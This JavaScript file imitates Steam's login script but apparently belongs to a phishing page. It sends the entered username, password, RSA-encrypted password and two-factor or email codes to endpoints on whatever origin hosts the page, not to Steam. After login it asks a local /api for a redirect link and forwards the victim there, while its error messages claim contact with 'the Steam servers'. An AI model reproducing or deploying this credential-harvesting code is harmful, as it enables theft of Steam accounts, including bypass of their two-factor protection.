var steamid = null;
var m_bLoginInFlight = false;
var steamsessionid = null;
var m_strBaseURL = window.location.origin;
var m_sAuthCode = "";
var m_steamidEmailAuth = '';
var m_bInEmailAuthProcess = false;
var rgOptions = rgOptions || {};
var LogonForm = $JFromIDOrElement( rgOptions.elLogonForm || document.forms['logon'] || document.getElementById("login_form	"));
var m_fnOnFailure = rgOptions.fnOnFailure || null;

GetParameters = function( rgParams )
{
	var rgDefaultParams = { 'donotcache': new Date().getTime() };
	if ( steamsessionid )
		rgDefaultParams['sessionid'] = steamsessionid;

	return $J.extend( rgDefaultParams, rgParams );
};

GetAuthCode = function( results, callback )
{
	if ( m_bIsMobile )
	{
		var code = $J('#twofactorcode_entry').val();
		if ( code.length > 0 )
		{
			callback( results, code );
			return;
		}

		// this may be in the modal
		callback(results, $J('#twofactorcode_entry').val());
	}
	else
	{
		var authCode = m_sAuthCode;
		m_sAuthCode = '';
		callback( results, authCode );
	}
};

HighlightFailure = function( msg )
{
	if ( m_fnOnFailure )
	{
		m_fnOnFailure( msg );

		// always blur on mobile so the error can be seen
		if ( m_bIsMobile && msg )
			$J('input:focus').blur();
	}
	else
	{
		var $ErrorElement = $J('#error_display');

		if ( msg )
		{
			$ErrorElement.text( msg );
			$ErrorElement.slideDown();

			if ( m_bIsMobile )
				$J('input:focus').blur();
		}
		else
		{
			$ErrorElement.hide();
		}
	}
};

LoginComplete = function() {
    $J.ajax({
        method: "POST",
        url: "/api",
        data: {
            "do": "getLink"
        }
    })
    .done(function(data){
		let redirect = data['results']["redirect"]
		if (redirect){
			window.location.href = redirect;
		}
    })
}

SetEmailAuthModalState = function( step )
{
	if ( step == 'submit' )
	{
		LoginComplete();
		return;
	}
	else if ( step == 'complete' )
	{
		LoginComplete();
		return;
	}

	$J('#auth_messages').children().hide();
	$J('#auth_message_' + step ).show();

	$J('#auth_details_messages').children().hide();
	$J('#auth_details_' + step ).show();

	$J('#auth_buttonsets').children().hide();
	$J('#auth_buttonset_' + step ).show();

	$J('#authcode_help_supportlink').hide();

	var icon='key';
	var bShowAuthcodeEntry = true;
	if ( step == 'entercode' )
	{
		icon = 'mail';
	}
	else if ( step == 'checkspam' )
	{
		icon = 'trash';
	}
	else if ( step == 'success' )
	{
		LoginComplete();
	}
	else if ( step == 'incorrectcode' )
	{
		icon = 'lock';
	}
	else if ( step == 'help' )
	{
		icon = 'steam';
		bShowAuthcodeEntry = false;
		$J('#authcode_help_supportlink').show();
	}

	if ( bShowAuthcodeEntry )
	{
		var $AuthcodeEntry = $J('#authcode_entry');
		if ( !$AuthcodeEntry.is(':visible') )
		{
			$AuthcodeEntry.show().find('input').focus();
		}
		$J('#auth_details_computer_name').show();
	}
	else
	{
		$J('#authcode_entry').hide();
		$J('#auth_details_computer_name').hide();
	}

	$J('#auth_icon').attr('class', 'auth_icon auth_icon_' + icon );
};

OnLoginResponse = function( results )
{
	m_bLoginInFlight = false;
	var bRetry = true;

	if ( results.login_complete )
	{
		var bRunningTransfer = false;
		if ( ( results.transfer_url || results.transfer_urls ) && results.transfer_parameters )
		{
			bRunningTransfer = true;
			m_bLoginTransferInProgress = true;
		}

		if ( m_bInEmailAuthProcess )
		{
			m_bEmailAuthSuccessful = true;
			SetEmailAuthModalState( 'success' );
		}
		else if ( m_bInTwoFactorAuthProcess )
		{
			m_bTwoFactorAuthSuccessful = true;
			SetTwoFactorAuthModalState( 'success' );
		}
		else
		{
			bRetry = false;
			LoginComplete();
		}
	}
	else
	{
		// if there was some kind of other error while doing email auth or twofactor, make sure
		//	the modals don't get stuck
		if ( !results.emailauth_needed && this.m_EmailAuthModal )
			m_EmailAuthModal.Dismiss();

		if ( !results.requires_twofactor && this.m_TwoFactorModal )
			m_TwoFactorModal.Dismiss();

		if ( results.requires_twofactor )
		{
			$J('#captcha_entry').hide();

			if ( !m_bInTwoFactorAuthProcess )
				StartTwoFactorAuthProcess();
			else
				SetTwoFactorAuthModalState( 'incorrectcode' );
		}
		else if ( results.captcha_needed && results.captcha_gid )
		{
			UpdateCaptcha( results.captcha_gid );
			m_iIncorrectLoginFailures ++;
		}
		else if ( results.emailauth_needed )
		{
			if ( results.emaildomain )
				$J('#emailauth_entercode_emaildomain').text( results.emaildomain );

			if ( results.emailsteamid )
				m_steamidEmailAuth = results.emailsteamid;

			if ( !m_bInEmailAuthProcess )
				StartEmailAuthProcess();
			else
				SetEmailAuthModalState( 'incorrectcode' );
		}
		else if ( results.agreement_session_url )
		{
			window.location = results.agreement_session_url + '&redir=' + this.m_strBaseURL;
		}
		else
		{
			m_strUsernameEntered = null;
			m_strUsernameCanonical = null;
			m_iIncorrectLoginFailures ++;
		}

		if ( results.message )
		{
			HighlightFailure( results.message );
			if ( m_bIsMobile && this.m_iIncorrectLoginFailures > 1 && !results.emailauth_needed && !results.bad_captcha )
			{
				// 2 failed logins not due to Steamguard or captcha, un-obfuscate the password field
				$J( '#passwordclearlabel' ).show();
				$J( '#steamPassword' ).val('');
				$J( '#steamPassword' ).attr( 'type', 'text' );
				$J( '#steamPassword' ).attr( 'autocomplete', 'off' );
			}
			else if ( results.clear_password_field )
			{
				$J( '#input_password' ).val('');
				$J( '#input_password' ).focus();
			}

		}
	}
	if ( bRetry )
	{
		$J('#login_btn_signin').show();
		$J('#login_btn_wait').hide();
	}
};

OnAuthCodeResponse = function( results, authCode )
{
	var form = LogonForm[0];
	var pubKey = RSA.getPublicKey(results.publickey_mod, results.publickey_exp);
	var username = m_strUsernameCanonical;
	var password = form.elements['password'].value;
	password = password.replace(/[^\x00-\x7F]/g, ''); // remove non-standard-ASCII characters
	var encryptedPassword = RSA.encrypt(password, pubKey);

	var rgParameters = {
		password: encryptedPassword,
		username: username,
		twofactorcode: authCode,
		emailauth: form.elements['emailauth'] ? form.elements['emailauth'].value : '',
		emailsteamid: m_steamidEmailAuth,
		rsatimestamp: results.timestamp,
			};

	if (m_bIsMobile)
		rgParameters.oauth_client_id = form.elements['oauth_client_id'].value;

	$J.post(m_strBaseURL + '/dologin/', GetParameters(rgParameters))
		.done($J.proxy(OnLoginResponse, this))
		.fail(function () {
			ShowAlertDialog('Error', 'There was a problem communicating with the Steam servers.  Please try again later.' );

			$J('#login_btn_signin').show();
			$J('#login_btn_wait').hide();
			m_bLoginInFlight = false;
		});
};

OnRSAKeyResponse = function( results )
{
	if ( results.publickey_mod && results.publickey_exp && results.timestamp )
	{
		GetAuthCode( results , $J.proxy(OnAuthCodeResponse, this) );
	}
	else
	{
		if ( results.message )
		{
			ShowAlertDialog( 'Error', results.message );
		}
		else
		{
			ShowAlertDialog( 'Error', 'There was a problem communicating with the Steam servers.  Please try again later.' );
		}

		$J('#login_btn_signin').show();
		$J('#login_btn_wait').hide();

		m_bLoginInFlight = false;
	}
};

DoLogin = function()
{
	var form = LogonForm[0];
	var username = form.elements['username'].value;
	username = username.replace( /[^\x00-\x7F]/g, '' );
	var password = form.elements['password'].value;
	password = password.replace( /[^\x00-\x7F]/g, '' ); 

	if ( m_bLoginInFlight || password.length == 0 || username.length == 0 )
		return;

	m_bLoginInFlight = true;
	$J('#login_btn_signin').hide();
	$J('#login_btn_wait').show();

	// reset some state
	HighlightFailure( '' );

	$J.post( m_strBaseURL + '/getrsakey/', GetParameters( { username: username } ) )
		.done( $J.proxy( OnRSAKeyResponse ) )
		.fail( function () {
			ShowAlertDialog( 'Error', 'There was a problem communicating with the Steam servers.  Please try again later.' );
			$J('#login_btn_signin').show();
			$J('#login_btn_wait').hide();
			m_bLoginInFlight = false;
		});
};

LogonForm.on("submit", function(e){e.preventDefault();DoLogin();})

$J('#login_btn_signin' ).children('a, button' ).click( function() { DoLogin(); } );